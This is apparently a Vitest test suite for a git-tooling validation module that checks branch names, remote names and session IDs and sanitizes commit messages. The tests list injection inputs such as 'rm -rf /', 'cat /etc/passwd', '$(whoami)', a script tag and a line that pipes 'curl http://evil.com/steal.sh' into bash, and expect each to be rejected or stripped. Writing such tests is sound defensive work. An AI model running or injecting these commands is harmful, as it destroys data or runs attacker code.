import { describe, it, expect } from 'vitest';
import {
  isValidBranchName,
  isValidRemoteName,
  sanitizeCommitMessage,
  isValidSessionId,
  assertValidBranchName,
  assertValidRemoteName,
  assertValidSessionId,
  MAX_BRANCH_NAME_LENGTH,
  MAX_REMOTE_NAME_LENGTH,
  MAX_COMMIT_MESSAGE_LENGTH,
} from '../src/validation.js';

describe('validation.ts', () => {
  describe('isValidBranchName', () => {
    describe('valid branch names', () => {
      it('should accept simple alphanumeric names', () => {
        expect(isValidBranchName('main')).toBe(true);
        expect(isValidBranchName('develop')).toBe(true);
        expect(isValidBranchName('feature123')).toBe(true);
      });

      it('should accept names with hyphens', () => {
        expect(isValidBranchName('feature-branch')).toBe(true);
        expect(isValidBranchName('bug-fix-123')).toBe(true);
      });

      it('should accept names with underscores', () => {
        expect(isValidBranchName('feature_branch')).toBe(true);
        expect(isValidBranchName('bug_fix_123')).toBe(true);
      });

      it('should accept names with forward slashes', () => {
        expect(isValidBranchName('feature/my-branch')).toBe(true);
        expect(isValidBranchName('fix/bug-123')).toBe(true);
        expect(isValidBranchName('release/v1.0.0')).toBe(true);
      });

      it('should accept names with dots (but not at start/end)', () => {
        expect(isValidBranchName('v1.0.0')).toBe(true);
        expect(isValidBranchName('release-1.2.3')).toBe(true);
      });

      it('should accept mixed case', () => {
        expect(isValidBranchName('MyFeature')).toBe(true);
        expect(isValidBranchName('Feature-ABC123')).toBe(true);
      });
    });

    describe('invalid branch names', () => {
      it('should reject empty strings', () => {
        expect(isValidBranchName('')).toBe(false);
      });

      it('should reject non-string inputs', () => {
        expect(isValidBranchName(null as any)).toBe(false);
        expect(isValidBranchName(undefined as any)).toBe(false);
        expect(isValidBranchName(123 as any)).toBe(false);
      });

      it('should reject names with spaces', () => {
        expect(isValidBranchName('feature branch')).toBe(false);
        expect(isValidBranchName(' feature')).toBe(false);
        expect(isValidBranchName('feature ')).toBe(false);
      });

      it('should reject names with shell metacharacters', () => {
        // Command injection attempts
        expect(isValidBranchName('feature; rm -rf /')).toBe(false);
        expect(isValidBranchName('feature && malicious')).toBe(false);
        expect(isValidBranchName('feature | cat /etc/passwd')).toBe(false);
        expect(isValidBranchName('feature$(whoami)')).toBe(false);
        expect(isValidBranchName('feature`whoami`')).toBe(false);

        // Individual metacharacters
        expect(isValidBranchName('feature;')).toBe(false);
        expect(isValidBranchName('feature&')).toBe(false);
        expect(isValidBranchName('feature|')).toBe(false);
        expect(isValidBranchName('feature$')).toBe(false);
        expect(isValidBranchName('feature`')).toBe(false);
        expect(isValidBranchName('feature<')).toBe(false);
        expect(isValidBranchName('feature>')).toBe(false);
        expect(isValidBranchName('feature"')).toBe(false);
        expect(isValidBranchName("feature'")).toBe(false);
        expect(isValidBranchName('feature\\')).toBe(false);
        expect(isValidBranchName('feature(')).toBe(false);
        expect(isValidBranchName('feature)')).toBe(false);
        expect(isValidBranchName('feature{')).toBe(false);
        expect(isValidBranchName('feature}')).toBe(false);
        expect(isValidBranchName('feature[')).toBe(false);
        expect(isValidBranchName('feature]')).toBe(false);
        expect(isValidBranchName('feature*')).toBe(false);
        expect(isValidBranchName('feature?')).toBe(false);
        expect(isValidBranchName('feature~')).toBe(false);
        expect(isValidBranchName('feature!')).toBe(false);
        expect(isValidBranchName('feature#')).toBe(false);
      });

      it('should reject names with newlines or control characters', () => {
        expect(isValidBranchName('feature\n')).toBe(false);
        expect(isValidBranchName('feature\r')).toBe(false);
        expect(isValidBranchName('feature\t')).toBe(false);
        expect(isValidBranchName('feature\x00')).toBe(false);
      });

      it('should reject names starting with a dot', () => {
        expect(isValidBranchName('.feature')).toBe(false);
        expect(isValidBranchName('.hidden')).toBe(false);
      });

      it('should reject names ending with a dot', () => {
        expect(isValidBranchName('feature.')).toBe(false);
        expect(isValidBranchName('branch.')).toBe(false);
      });

      it('should reject names with consecutive dots', () => {
        expect(isValidBranchName('feature..branch')).toBe(false);
        expect(isValidBranchName('v1..0')).toBe(false);
      });

      it('should reject names ending with .lock', () => {
        expect(isValidBranchName('feature.lock')).toBe(false);
        expect(isValidBranchName('my-branch.lock')).toBe(false);
      });

      it('should reject names ending with a slash', () => {
        expect(isValidBranchName('feature/')).toBe(false);
        expect(isValidBranchName('release/v1.0/')).toBe(false);
      });

      it('should reject names exceeding maximum length', () => {
        const longName = 'a'.repeat(MAX_BRANCH_NAME_LENGTH + 1);
        expect(isValidBranchName(longName)).toBe(false);
      });

      it('should accept names at maximum length', () => {
        const maxName = 'a'.repeat(MAX_BRANCH_NAME_LENGTH);
        expect(isValidBranchName(maxName)).toBe(true);
      });
    });
  });

  describe('isValidRemoteName', () => {
    describe('valid remote names', () => {
      it('should accept common remote names', () => {
        expect(isValidRemoteName('origin')).toBe(true);
        expect(isValidRemoteName('upstream')).toBe(true);
        expect(isValidRemoteName('fork')).toBe(true);
      });

      it('should accept names with hyphens', () => {
        expect(isValidRemoteName('my-fork')).toBe(true);
        expect(isValidRemoteName('company-origin')).toBe(true);
      });

      it('should accept names with underscores', () => {
        expect(isValidRemoteName('my_fork')).toBe(true);
        expect(isValidRemoteName('remote_1')).toBe(true);
      });

      it('should accept names with dots', () => {
        expect(isValidRemoteName('remote.backup')).toBe(true);
        expect(isValidRemoteName('origin.old')).toBe(true);
      });

      it('should accept mixed case', () => {
        expect(isValidRemoteName('MyOrigin')).toBe(true);
        expect(isValidRemoteName('Remote1')).toBe(true);
      });
    });

    describe('invalid remote names', () => {
      it('should reject empty strings', () => {
        expect(isValidRemoteName('')).toBe(false);
      });

      it('should reject non-string inputs', () => {
        expect(isValidRemoteName(null as any)).toBe(false);
        expect(isValidRemoteName(undefined as any)).toBe(false);
        expect(isValidRemoteName(123 as any)).toBe(false);
      });

      it('should reject names with spaces', () => {
        expect(isValidRemoteName('my origin')).toBe(false);
        expect(isValidRemoteName(' origin')).toBe(false);
        expect(isValidRemoteName('origin ')).toBe(false);
      });

      it('should reject names with shell metacharacters', () => {
        // Command injection attempts
        expect(isValidRemoteName('origin; rm -rf /')).toBe(false);
        expect(isValidRemoteName('origin && malicious')).toBe(false);
        expect(isValidRemoteName('origin | cat /etc/passwd')).toBe(false);
        expect(isValidRemoteName('origin$(whoami)')).toBe(false);
        expect(isValidRemoteName('origin`whoami`')).toBe(false);

        // Individual metacharacters
        expect(isValidRemoteName('origin;')).toBe(false);
        expect(isValidRemoteName('origin&')).toBe(false);
        expect(isValidRemoteName('origin|')).toBe(false);
        expect(isValidRemoteName('origin$')).toBe(false);
        expect(isValidRemoteName('origin`')).toBe(false);
        expect(isValidRemoteName('origin<')).toBe(false);
        expect(isValidRemoteName('origin>')).toBe(false);
        expect(isValidRemoteName('origin"')).toBe(false);
        expect(isValidRemoteName("origin'")).toBe(false);
      });

      it('should reject names with forward slashes', () => {
        expect(isValidRemoteName('origin/fork')).toBe(false);
        expect(isValidRemoteName('remote/path')).toBe(false);
      });

      it('should reject names starting with a hyphen', () => {
        expect(isValidRemoteName('-origin')).toBe(false);
        expect(isValidRemoteName('--malicious')).toBe(false);
      });

      it('should reject names exceeding maximum length', () => {
        const longName = 'a'.repeat(MAX_REMOTE_NAME_LENGTH + 1);
        expect(isValidRemoteName(longName)).toBe(false);
      });

      it('should accept names at maximum length', () => {
        const maxName = 'a'.repeat(MAX_REMOTE_NAME_LENGTH);
        expect(isValidRemoteName(maxName)).toBe(true);
      });
    });
  });

  describe('sanitizeCommitMessage', () => {
    describe('valid commit messages', () => {
      it('should preserve simple messages', () => {
        expect(sanitizeCommitMessage('Fix bug in parser')).toBe('Fix bug in parser');
        expect(sanitizeCommitMessage('Add new feature')).toBe('Add new feature');
        expect(sanitizeCommitMessage('Update documentation')).toBe('Update documentation');
      });

      it('should preserve messages with basic punctuation', () => {
        expect(sanitizeCommitMessage('Fix: bug in parser')).toBe('Fix: bug in parser');
        expect(sanitizeCommitMessage('Add feature (v2)')).toBe('Add feature (v2)');
        expect(sanitizeCommitMessage('Update README.md')).toBe('Update README.md');
      });

      it('should preserve multi-word messages', () => {
        expect(sanitizeCommitMessage('Fix multiple bugs in the parser module')).toBe(
          'Fix multiple bugs in the parser module'
        );
      });

      it('should preserve allowed special characters', () => {
        const message = 'Fix: bug #123 - improve performance by +10%';
        expect(sanitizeCommitMessage(message)).toBe('Fix: bug #123 - improve performance by +10%');
      });
    });

    describe('sanitization of dangerous content', () => {
      it('should remove shell metacharacters', () => {
        expect(sanitizeCommitMessage('Fix; rm -rf /')).toBe('Fix rm -rf /');
        expect(sanitizeCommitMessage('Fix && malicious')).toBe('Fix malicious'); // Spaces collapsed
        expect(sanitizeCommitMessage('Fix | cat /etc/passwd')).toBe('Fix cat /etc/passwd');
        expect(sanitizeCommitMessage('Fix $(whoami)')).toBe('Fix (whoami)');
        expect(sanitizeCommitMessage('Fix `whoami`')).toBe('Fix whoami');
      });

      it('should remove double quotes', () => {
        expect(sanitizeCommitMessage('Fix "bug" in parser')).toBe('Fix bug in parser');
      });

      it('should remove single quotes', () => {
        expect(sanitizeCommitMessage("Fix 'bug' in parser")).toBe('Fix bug in parser');
      });

      it('should remove backticks', () => {
        expect(sanitizeCommitMessage('Fix `bug` in parser')).toBe('Fix bug in parser');
      });

      it('should remove backslashes', () => {
        expect(sanitizeCommitMessage('Fix\\bug')).toBe('Fixbug');
      });

      it('should remove angle brackets', () => {
        expect(sanitizeCommitMessage('Fix <script>alert(1)</script>')).toBe(
          'Fix scriptalert(1)/script'
        );
      });

      it('should replace control characters with spaces', () => {
        expect(sanitizeCommitMessage('Fix\nbug')).toBe('Fix bug');
        expect(sanitizeCommitMessage('Fix\rbug')).toBe('Fix bug');
        expect(sanitizeCommitMessage('Fix\tbug')).toBe('Fix bug');
        expect(sanitizeCommitMessage('Fix\x00bug')).toBe('Fix bug');
      });

      it('should collapse multiple spaces', () => {
        expect(sanitizeCommitMessage('Fix    bug')).toBe('Fix bug');
        expect(sanitizeCommitMessage('Fix  \n  bug')).toBe('Fix bug');
      });

      it('should trim whitespace', () => {
        expect(sanitizeCommitMessage('  Fix bug  ')).toBe('Fix bug');
        expect(sanitizeCommitMessage('\nFix bug\n')).toBe('Fix bug');
      });
    });

    describe('edge cases', () => {
      it('should handle empty strings', () => {
        expect(sanitizeCommitMessage('')).toBe('');
      });

      it('should handle non-string inputs', () => {
        expect(sanitizeCommitMessage(null as any)).toBe('');
        expect(sanitizeCommitMessage(undefined as any)).toBe('');
      });

      it('should truncate messages exceeding maximum length', () => {
        const longMessage = 'a'.repeat(MAX_COMMIT_MESSAGE_LENGTH + 100);
        const sanitized = sanitizeCommitMessage(longMessage);
        expect(sanitized.length).toBe(MAX_COMMIT_MESSAGE_LENGTH);
      });

      it('should handle messages with only special characters', () => {
        expect(sanitizeCommitMessage('$$$')).toBe('');
        expect(sanitizeCommitMessage(';;;')).toBe('');
        expect(sanitizeCommitMessage('```')).toBe('');
      });

      it('should handle complex injection attempts', () => {
        const injection = 'Fix; $(curl http://evil.com/steal.sh | bash)';
        const sanitized = sanitizeCommitMessage(injection);
        expect(sanitized).not.toContain(';');
        expect(sanitized).not.toContain('$');
        expect(sanitized).not.toContain('|');
      });
    });
  });

  describe('isValidSessionId', () => {
    describe('valid session IDs', () => {
      it('should accept valid UUID v4', () => {
        expect(isValidSessionId('550e8400-e29b-41d4-a716-446655440000')).toBe(true);
        expect(isValidSessionId('6ba7b810-9dad-11d1-80b4-00c04fd430c8')).toBe(true);
        expect(isValidSessionId('123e4567-e89b-12d3-a456-426614174000')).toBe(true);
      });

      it('should accept UUID v4 regardless of case', () => {
        expect(isValidSessionId('550E8400-E29B-41D4-A716-446655440000')).toBe(true);
        expect(isValidSessionId('550e8400-E29B-41d4-A716-446655440000')).toBe(true);
      });

      it('should accept alphanumeric with hyphens', () => {
        expect(isValidSessionId('session-abc123')).toBe(true);
        expect(isValidSessionId('terminal-1-2-3')).toBe(true);
        expect(isValidSessionId('abc-123-xyz')).toBe(true);
      });

      it('should accept purely alphanumeric', () => {
        expect(isValidSessionId('session123')).toBe(true);
        expect(isValidSessionId('abc123xyz')).toBe(true);
      });
    });

    describe('invalid session IDs', () => {
      it('should reject empty strings', () => {
        expect(isValidSessionId('')).toBe(false);
      });

      it('should reject non-string inputs', () => {
        expect(isValidSessionId(null as any)).toBe(false);
        expect(isValidSessionId(undefined as any)).toBe(false);
        expect(isValidSessionId(123 as any)).toBe(false);
      });

      it('should accept valid session IDs that are not UUIDs', () => {
        expect(isValidSessionId('not-a-uuid')).toBe(true); // This is alphanumeric with hyphens
        expect(isValidSessionId('550e8400-e29b-41d4-a716')).toBe(true); // Short but alphanumeric
        expect(isValidSessionId('550e8400-e29b-41d4-a716-446655440000-extra')).toBe(true); // Long but alphanumeric
      });

      it('should reject IDs with shell metacharacters', () => {
        expect(isValidSessionId('session; rm -rf /')).toBe(false);
        expect(isValidSessionId('session && malicious')).toBe(false);
        expect(isValidSessionId('session | cat /etc/passwd')).toBe(false);
        expect(isValidSessionId('session$(whoami)')).toBe(false);
        expect(isValidSessionId('session`whoami`')).toBe(false);

        // Individual metacharacters
        expect(isValidSessionId('session;')).toBe(false);
        expect(isValidSessionId('session&')).toBe(false);
        expect(isValidSessionId('session|')).toBe(false);
        expect(isValidSessionId('session$')).toBe(false);
        expect(isValidSessionId('session`')).toBe(false);
      });

      it('should reject IDs with special characters', () => {
        expect(isValidSessionId('session_id')).toBe(false);
        expect(isValidSessionId('session.id')).toBe(false);
        expect(isValidSessionId('session/id')).toBe(false);
        expect(isValidSessionId('session id')).toBe(false);
      });

      it('should reject IDs exceeding maximum length', () => {
        const longId = 'a'.repeat(101);
        expect(isValidSessionId(longId)).toBe(false);
      });

      it('should accept IDs at maximum length', () => {
        const maxId = 'a'.repeat(100);
        expect(isValidSessionId(maxId)).toBe(true);
      });
    });
  });

  describe('assertValidBranchName', () => {
    it('should not throw for valid branch names', () => {
      expect(() => assertValidBranchName('feature-branch')).not.toThrow();
      expect(() => assertValidBranchName('main')).not.toThrow();
    });

    it('should throw for invalid branch names', () => {
      expect(() => assertValidBranchName('feature; rm -rf /')).toThrow('Invalid branch name');
      expect(() => assertValidBranchName('.hidden')).toThrow('Invalid branch name');
    });

    it('should include context in error message', () => {
      expect(() => assertValidBranchName('bad;name', 'merge operation')).toThrow(
        'Invalid branch name for merge operation'
      );
    });
  });

  describe('assertValidRemoteName', () => {
    it('should not throw for valid remote names', () => {
      expect(() => assertValidRemoteName('origin')).not.toThrow();
      expect(() => assertValidRemoteName('upstream')).not.toThrow();
    });

    it('should throw for invalid remote names', () => {
      expect(() => assertValidRemoteName('origin; rm -rf /')).toThrow('Invalid remote name');
      expect(() => assertValidRemoteName('-malicious')).toThrow('Invalid remote name');
    });

    it('should include context in error message', () => {
      expect(() => assertValidRemoteName('bad;name', 'push operation')).toThrow(
        'Invalid remote name for push operation'
      );
    });
  });

  describe('assertValidSessionId', () => {
    it('should not throw for valid session IDs', () => {
      expect(() => assertValidSessionId('550e8400-e29b-41d4-a716-446655440000')).not.toThrow();
      expect(() => assertValidSessionId('session-123')).not.toThrow();
    });

    it('should throw for invalid session IDs', () => {
      expect(() => assertValidSessionId('session; rm -rf /')).toThrow('Invalid session ID');
      expect(() => assertValidSessionId('session$bad')).toThrow('Invalid session ID');
    });

    it('should include context in error message', () => {
      expect(() => assertValidSessionId('bad;id', 'terminal session')).toThrow(
        'Invalid session ID for terminal session'
      );
    });
  });
});
